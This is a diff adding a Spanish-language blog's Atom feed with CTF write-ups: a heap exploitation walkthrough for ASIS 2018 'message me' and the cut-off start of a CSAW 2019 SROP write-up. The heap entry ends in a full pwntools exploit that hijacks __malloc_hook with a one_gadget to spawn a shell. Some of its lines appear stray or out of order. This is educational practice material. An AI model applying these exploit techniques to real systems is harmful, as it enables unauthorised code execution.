@@ -1,0 +1,1563 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-02-08T15:48:44-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">ROPemporium 2020 soluciones</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/11/17/ropemporium-2020-soluciones.html" rel="alternate" type="text/html" title="ROPemporium 2020 soluciones" /><published>2020-11-17T09:09:00-03:00</published><updated>2020-11-17T09:09:00-03:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/11/17/ropemporium-2020-soluciones</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/11/17/ropemporium-2020-soluciones.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Hola! Aca les dejo un link a mis soluciones para ROPemporium 2020. &lt;a href=&quot;https://github.com/dplastico/ROPemporium2020&quot;&gt;https://github.com/dplastico/ROPemporium2020&lt;/a&gt; .&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ya había publicado las soluciones de estos desafíos hace un tiempo, pero aprovechando que se han actualizado, decidí resolverlos todos en vivo en varios stream que realice en mi &lt;a href=&quot;https://www.twitch.tv/dplastico&quot;&gt;twitch&lt;/a&gt;. Además pueden revisar las grabaciones en mi canal de &lt;a href=&quot;https://www.youtube.com/user/dplastico/&quot;&gt;youtube&lt;/a&gt;.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Espero que les sirva/guste!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">Hola! Aca les dejo un link a mis soluciones para ROPemporium 2020. https://github.com/dplastico/ROPemporium2020 .</summary></entry><entry><title type="html">WRITEUP, “message me” ASIS 2018, heap, fastbindup, UAF</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/08/18/writeup-message-me-asis-2018-heap-fastbindup-uaf.html" rel="alternate" type="text/html" title="WRITEUP, “message me” ASIS 2018, heap, fastbindup, UAF" /><published>2020-08-18T11:56:00-04:00</published><updated>2020-08-18T11:56:00-04:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/08/18/writeup-message-me-asis-2018-heap-fastbindup-uaf</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/08/18/writeup-message-me-asis-2018-heap-fastbindup-uaf.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;¡Hola! Ayer estuve haciendo un desafío con el ánimo de practicar y resultó bastante entretenido, así que hice un writeup, ¡espero que les guste! El desafío es un challenge de ASIS 2018 titulado message me. Pueden encontrar el binario y la versión de libc provista en el siguiente&lt;a href=&quot;https://github.com/dplastico/messagemeporta&quot;&gt; &lt;/a&gt;&lt;a href=&quot;https://github.com/dplastico/messageme&quot;&gt;link &lt;/a&gt;(además de la solución que detallaremos ahora) Recuerden que deben parchar la version de libc con el respectivo loader, yo en lo personal uso &lt;a href=&quot;https://github.com/NixOS/patchelf&quot;&gt;patchelf&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Bueno analizamos el binario y vemos que es un ELF de 64 bit sin PIE (aunque no importara mucho ya verán) canary y Partial RELRO&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/28Us5ztVebP2dt5uLTf0E_hYqfGwvxBgVCA_5tTsdl5-J-hCs1UuPho4im72G8B7N6g-11wwn4TyJZ9OnUScBoQzENShRI6nTMw09XtGJNx1qR-Fhs6JKujNFqsHU0ib29zIn1Jn&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Observamos el binario el cual solo observando el menú podemos ver que es un desafío de heap, el cual nos permite agregar (malloc) remover(free) mostrar el mensaje y cambiar el timestamp (ya abordaremos esto).&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/8RJIxvlIRNAHDJkDpeh8GP2kqU9zeveFMKzilXI5p9JN4eE2397bOZgcpIR8xFlEzzfzO1g2Eh1WLbaOHQQUtvTIsmRbctTqOUzSoZHAh8kVCHa0pkeqkAYET3cje6igeD9tOH8-&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&amp;nbsp;Obviamente nos encontramos frente a un binario con explotación de heap. No voy a detallar todos los pasos del heap explotation, pero si pueden leer acerca de malloc y free aca:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://sourceware.org/glibc/wiki/MallocInternals&quot;&gt;Malloc internals&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y sobre explotación de heap les recomiendo este sitio:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;How2Heap&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora veamos reversar el challenge, podemos ver que fuera del timestamp (aun no!!! ) todo es “normal” tenemos un menu, llamamos a malloc, free, pero vemos que las variables no se inicializan bien lo cual nos permite un UAF (use after free) e incluso un DF (double free) pero que veremos será difícil de atacar&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/gluuYp971pjmhkmzHijPO_jWs_0eMZb9iW137zHImuT1djUpQX3wAIbSBd_zg0XWfz4zN1c4QzwQjG8gBe68GtJJNJtbzuOfrgwgJoQ37FOEgEAd7cCVrxvVct82x7F_lpGqo7S_&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/m2Bc4c8mBigIXBfzVUlGFCNwLUV2rFu1V2qHy_jQXpZZzo35uYUA1WjvAg3wf1AAc-Us9yIDNJfFiaxXWvPEsg3rvDZNsahGW0iOCRBoPOqmiT8kRQXkPdxXEo-pT5bxQA3bXwoC&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pues bien con esto en mente intentemos explotar el binario, para eos primero creamos algunas funciones que nos ayudarán en nuestro exploit, algo un poco molesto era el buffering, que no me di el tiempo de reversar para analizar por qué ocurría, pero eso me obligó a poner llamadas a sleep entre cada input para poder enviar bien el payload (ta lo verán en el código) De todas formas nótese que cuando tratamos de hacer double free tenemos que superar la mitigación de fast top (por tanto tenemos que darle free a un chunk, entre medio)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/E6Haw2m-mWfzgVybwmHbTz-12PYq75Lu8PeOH4kW2kWFx8oJPsknBvEDhYYkljKPORwzQCYOd10pxzHiHkzeoEm7HOQl2MJ1zB12G3wjMQZATN0VjrFL2Kqt8UCrAlVBt35AnycG&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/X4WH9gNBVV9aCVAnFcq3iVc_oOsf_PJMeFToAAVLDmymk4Pv2cWelMN0Z1FXnV7E5AFio3oUeTJj2uf0UtljUfZDvOdnNeDjnUVrZqZiFb_INWDvKr10pA0CklZ-xffcELoZH8C0&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;br /&gt;Ahora cuando comenzamos a asignar “chunks” o bloques como son llamados (me referiré a chunks, porque spanglish, uwu) a estos se le agrega un timestamp, lo cual nos traerá problemas, ya que aprovechandonos de UAF o el DF podríamos “tampear” el fd con nuestra data, pero vemos que esto no se podrá, alocamos algunos chunk y revisamos con vis (comando de pwndbg para mostrar el heap) Además agrega 0x10 al size de nuestro payload (chunk)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/NNZpq3AuJmssQqsGSfcMUHrNdYF7wf9hHa9xyuPuE4ZGjB3czLd74vQsM7YMocozZQ-p2Bo8za-NguCS55UyUIx9jtdGk8UD334Tl1oXUD7xuXPvrr_s6HcroMuLJES4gVKBhG7k&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Esto nos dificulta la explotación, por lo que trataremos de generar un leak, y para eso utilizaremos un chunk fuera del rango de fastbins (por defecto arriba de 0x80) para enviarlo al unsorted bin, esto nos permitirá lekear con el UAF una dirección de libc&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/VaI70rp5ZG2BkXXKoib9W_u02pgErlbSeTXmP5LzndTVLnm4VpK1457uS4isLc0f5PWLtjNYbSn60Vzx4XiUnOjsPA4zJppE9qLAzcrckOKbgHBj_q3_vyBoLyOUbnS7R5mns_kK&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Así ya con esto podemos codear y generar el leak&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/UDMLsQavVsCQLA_5SU58LRQu1u3hM47TJZagbphPLH1opt3_OXZoflu_B1FIGh9H6umAS-WsWQMO2wo_-EL3lvNbBlepr_jC_Rf1uL-PjwVNw3XRUFEoMoibkEBaN636T8upbOER&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pues bien ahora que tenemos un leak de libc podemos calcular direcciones y “tampear” un posible “FD” para llamar un bloque falso (fake chunk) y así sobreescribir alguna dirección importante, como no tenemos leak de HEAP&amp;nbsp; o del binario en sí, apuntaremos a libc, y para eso intentaremos sobreescribir “malloc_hook”, ya que al sobrescribir este “hook” cada vez que se llame a malloc() se ejecutara nuestro payload (que sobreescribimos en el malloc hook)&amp;nbsp; puedes encontrar información sobre los hook  &lt;a href=&quot;https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html&quot;&gt;aca&amp;nbsp;&lt;/a&gt; y &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc/&quot;&gt;aca&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora nuestro problema es el timestamp.. Que podemos hacer? No podemos hacer un DF ya que nuestros FD no podemos “tampearlos”, si intentamos escribir el chunk free nos devolverá un timestamp, pues bueno despues de mucho me di cuenta que si usaba la opción “change timestamp” esta cambiaba el valor e iba aumentando, eventualmente me di cuenta que si lo cmabiaba 3 veces este aumentaba 0x10 siempre. Por lo que usare ese cambio para modificar un FD válido y generar un Double free modificando el valor del FD a apuntar a un chunk nuevo debajo de él mismo en el heap… Suena enredado pero ahora se entenderá&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Primero creamos 3 chunks en el rango de fastbin (solo dos usaremos, pero el primero es para hacer de top, y ademas por que inicialmente intente sobreescribir el free hook, y ese chunk seria mi argv, pero esto no lo pude hacer hehehe) se puede ver que como es esperado una vez liberado el chunk apunta al chunk liberado anteriormente (single list)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/abtdMeyvK-b-k1E4Fp_Bx_IU5GkCdA37n9OvRZKn2qb0HXXIeNNovvJFLO4CsalXDyhWsHKl1wK6rrv1CQBykvf0hpZcvv3leCeY9EDXfi6hVHaH8118n8gDOwfsZzAfIZz0MHEU&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pues si modificamos el timestamp vemos que el valor cambia&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/Xh_S0NWlP2SsNLipJ6nrFSVNgGK3mxprtw3-wCLxHYxY5jyqLBh2j9wm4I8j4HFruJRlYLIKZNIXP80mKpd-3VO16caKjdLTaE_LHV8JJd9A66ol7xaoBq65t-zCGCZ8N1YJH7k9&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Si lo repetimos dos veces más llega a apuntar justo abajo de nuestro chunk donde he creado un “fake chunk” del mismo tamaño:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/G1enjEBTpgfOyP73f853uVbMXnAeT2JA810uQliKgZL68YIVf7NZuSiq8UYmiwR7AnzH1X5aV9whq3GA9U8vhwi24sSMUaaUBxFpl0D47lOKR0S472GLBWSU1UQYkjk38jEcgWK4&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto tenemos una primitiva de fastbins dup, sin DF, pero simulado creamos un puntero a un fake nuestro, intentaremos entonces sobrescribir dicho valor con malloc hook -16, para detenernos justo sobre el hook y escribir,&amp;nbsp; y así redirigir hacia allá el flujo del programa&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/PUcufC69RWTiPVIbaCrz8zfG5qmdLkuLUkVyV6VaXV8DDozXfqdVXnA5JY4K-CINEulACzJ6NyUNFIvsnicFFBJavn7-gVxD3RiZskOA-g9SO3OOLaxexOGHtpAeuEEU2Mu4yKc0&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto ya podemos redirigir a malloc como nuestra el comando fastbins&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/XRCLbK9jdWMhaMnwi_AGUZCU6_v9FO3t80VpsbgMpJd6oMKvVmdkK04gKNCg5OH8cVMzrHKUKNE3sE0nYVFLKc4y7Deky5Say1UCdci4NLnZn2llLZcDgGOU4LbakMXabxWGiH0U&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Esto nos provoca un error ya que existe una mitigación en libc dado que el chunk que estoy llamando no tiene el “size” apropiado (podemos usar frame, para ver el error)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/Y_14jiY8E1OTNGmZgRVk5d4Iv7HLx5f2ULIhCCqfoGKSVSSkha3GNCHLap9NXJkqvsM3cp3aPfrSsItDg7D-wiiFOG6NkbMngW__Let5mnBRArXxRcMJxqbbB6v1L45nsOyUdjbc&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&amp;nbsp;si revisamos en malloc_hook -16 tenemos un null quadword… Por tanto debemos buscar un size apropiado cerca de malloc_hook. Una cosa importante de mencionar, es que malloc no revisa el alineamiento de las direcciones en la llamada por tanto si “desreferenciamos” alguna dirección con un tamaño apropiado, podremos usarla, obviamente también hay magias de pwndbg que nos permiten encontrar un 7f size, cerca de malloc hook&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/aGd9nX1xh6qd_LeKJl1vg4hkpDXjQ5KDeeLmhV-BTlO4XcXh40H5JqcZjf3RH4nDIEqPCHDIWEPuiyW1T_5yyF1F2aMtQ0d-xbRmZ_GTKX2Y7R70D1x1-IFYJ3ENuoofyvfNwyeH&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/NnYnw0OiCNnWD0jHtvanklXaimMXpyP0D9T1fSavjB-kRgEkXqsDUnUmmTurquYeyKqEB8YGEeAne_GyYam8HB53PjHt6VjbIEiiU5ypGMJHvZlnn8HB7mo4BjDwV53yU6LbFbbv&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Modificamos nuestro payload para calzar con el offset a nuestro fake size&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/msVyo0ZGpPAfWpviAJjVEJaRoOyAyUab5rbPVk4bymkI05VQ8WTDKJclzHThLWNIuiZGUYTsbOWo7jMM6PJ3njK_V8Fryc0gG8y57x0qXoDlDZ43WLvyZzs2y8B6O7A1nC4pCdcj&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y modificamos nuestra llamada que sobreescribirá malloc con algún valor&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/acdPWNNsUT3DZEN0Eu4KUXqrV9Omh8xaX5ZDi9AgKZSHObmEvi7XSqYFUr6KSsnRW61un6wOJRwvFN8wekb1pHLO94P4h-146O1u-wRMco0TeoV9d2XLU00jKrdtz4RzuR6uzhNb&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ejecutamos y vemos que podemos sobreescribir el hook sin problemas y redirigir el flujo del programa&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/qGgFlW0n39k2kzinN5hpE8f-Q86VA1cEY5g0tKRcwKeb2CET0JuyfPWCOJKg8Is98meaTIWKPqzVEO_l0mLXz9yAGFXP-lU2mkI6Sc2ES5mgQY5zCev9FlX9OnBwh-txiOYX8A-p&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto solo nos queda solo ver como obtener una shell, esta vez fue sencillo, usamos un one_gadget dentro de libc que buscamos con la herramienta del mismo nombre&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/mSN82czasednuGUxg0_1Qox1SNrNy9jPcWxw6IbLjGk02NZ5FO0JFqkaJRxZjVLUowU2SyP_8UQgCvbTxfJOzHz5ZWDDvfApyPtzTZUJPDcWr0oPyziOASBzEiPpJ_21DriEumQB&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/BGbhiwpOi-OBU9fOS7FuNKfwGDm5DiW_Tmq-EVvv4lNcmqLaLtrn2TJaO-dQoT61nlsyY5MC0F0G7tXieXpas8Woij2dT_jIKwOiwJpMxrNtLWclepGCkoGYmWkqxJxru7Ltb4Es&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y obtenemos una shell luego de llamar a malloc nuevamente, acá el exploit final:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;#!/usr/bin/python3
+from pwn import *
+#binary setup
+elf = context.binary = ELF('./message')
+context.terminal = ['tmux', 'splitw', '-hp', '70']
+gs = '''
+continue
+'''
+libc = elf.libc
+index = 0
+def start():
+    if args.GDB:
+        return gdb.debug('./message', gdbscript=gs)
+    if args.REMOTE:
+        return remote('127.0.0.1', 5555)
+    else:
+        return process('./message')
+#add a message
+def malloc(size, data):
+    global index
+    r.sendline(&quot;0&quot;)
+    r.sendline(f&quot;{size}&quot;)
+    r.sendline(data)
+    index += 1
+    return index - 1
+    print(&quot;index, &quot;,index-1)
+#remove the message
+def free(index):
+    r.sendline(&quot;1&quot;)
+    r.sendline(f&quot;{index}&quot;)
+    #r.recvuntil(&quot;choice :&quot;)
+#show the message
+def show(index):
+    r.sendline(&quot;2&quot;)
+    sleep(0.2)
+    r.sendline(f&quot;{index}&quot;)
+    resp = r.recv(0x58)
+    #r.recvuntil(&quot;choice :&quot;)
+    return resp
+#3 change the timestamp
+def change(index):
+    r.sendline(&quot;3&quot;)
+    r.sendline(f&quot;{index}&quot;)
+
+r = start()
+#========= exploit here ===================
+#sleeps for the buffering of the binary
+#===== LEAK ==========
+leak = malloc(0x200, &quot;A&quot; *8)
+sleep(0.3)
+guard = malloc(0x18, &quot;YYYYYYYY&quot;)
+r.timeout = 0.1
+show(leak) #ctipe first
+sleep(0.3)
+free(leak) #free chunk
+sleep(0.3)
+show(leak) #show leak
+#it seems im buffering the output so some timeouts
+#maybe there's a better way to do it
+r.recvuntil(&quot;Message : &quot;)
+r.timeout = 0.1
+sleep(0.3)
+r.recvuntil(&quot;Message : &quot;)
+r.timeout = 0.1
+l = u64(r.recvline().strip().ljust(8,b'\x00'))
+libc.address = l - 0x399b78
+#no mitigations for fake chunk sizes
+log.info(f&quot;libc leak {hex(l)}&quot;)
+log.info(f&quot;libc base {hex(libc.address)}&quot;)
+log.info(f&quot;malloc hook {hex(libc.sym.__malloc_hook)}&quot;)
+log.info(f&quot;free hook {hex(libc.sym.__free_hook)}&quot;)
+
+#============ redirecting flow of execution =====
+
+#double free (cuidado con el topfast)
+#since we have a stamp date lets try to create fake chunks
+#allocating 2 chunks and a top one to anchor
+top_fast = malloc(96, &quot;X&quot;*8)
+sleep(0.3)
+A = malloc(96, p64(0x71) + p64(libc.sym.__malloc_hook-16))#fake chunk near malloc hook
+sleep(0.3)
+B = malloc(96, &quot;B&quot;*8)
+sleep(0.3)
+r.timeout = 0.1
+#free (not double free lest stack them manually)
+free(top_fast)
+sleep(0.3)
+free(A)
+sleep(0.3)
+free(B)
+sleep(0.3)
+#change the stamp 3 times will add 0x10
+change(B)
+sleep(0.3)
+change(B)
+sleep(0.3)
+change(B)
+sleep(0.3)
+setting up the fastbindup attack
+C = malloc(96, &quot;C&quot;* 32)
+sleep(0.3)
+D = malloc(96, &quot;D&quot;* 32)
+sleep(0.3)
+win - 0xdeadbeef
+malloc(96, b&quot;A&quot; *11 + win)
+
+win = p64(libc.address + 0xd6701)
+#win - 0xdeadbeef
+malloc(96, b&quot;A&quot; *11 + win) #add the one_gadget here
+sleep(0.3)
+malloc(24, &quot;Y&quot;) #trigger malloc_hook
+
+#========= interactive ====================
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">¡Hola! Ayer estuve haciendo un desafío con el ánimo de practicar y resultó bastante entretenido, así que hice un writeup, ¡espero que les guste! El desafío es un challenge de ASIS 2018 titulado message me. Pueden encontrar el binario y la versión de libc provista en el siguiente link (además de la solución que detallaremos ahora) Recuerden que deben parchar la version de libc con el respectivo loader, yo en lo personal uso patchelf</summary></entry><entry><title type="html">WRITEUP, small_boi csaw19, aprendiendo SROP</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/07/14/writeup-small_boi-csaw19-aprendiendo-srop.html" rel="alternate" type="text/html" title="WRITEUP, small_boi csaw19, aprendiendo SROP" /><published>2020-07-14T00:00:00-04:00</published><updated>2020-07-14T00:00:00-04:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/07/14/writeup-small_boi-csaw19-aprendiendo-srop</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/07/14/writeup-small_boi-csaw19-aprendiendo-srop.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Tenía guardado este writeup, para hablar de SROP, pero justo el ctf de &lt;a href=&quot;https://www.linkedin.com/showcase/convid/?viewAsMember=true&quot;&gt;convid&lt;/a&gt;, me pilló con un desafío en el que &lt;a href=&quot;/writeup-scandinavian-journal-of-psychology/&quot;&gt;ocupe esta técnica&lt;/a&gt;, de todas formas y para que no se pierda aca les dejo el writeup. Es un binario del ctf &lt;a href=&quot;https://ctftime.org/event/870&quot;&gt;CSAW 2019&lt;/a&gt; de 100 puntos llamado “small_boi” (pueden descargarlo de &lt;a href=&quot;https://github.com/dplastico/small_boi/blob/master/small_boi&quot;&gt;aca&lt;/a&gt;) el cual resolveremos usando la técnica de sig return oriented programming.&amp;nbsp;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y Bueno que es &lt;a href=&quot;https://en.wikipedia.org/wiki/Sigreturn-oriented_programming&quot;&gt;SROP&lt;/a&gt;?&amp;nbsp; Es una técnica usa en caso de estar presente a un escenario en el cual tenemos protección NX activada y usamos el syscall sig return para “limpiar” el stack frame (me perdonaran no se me ocurre mejor forma de explicarlo) permitiéndonos asignar a cada registro al valor que deseemos.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:217} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/07/image.png&quot; alt=&quot;&quot; class=&quot;wp-image-217&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
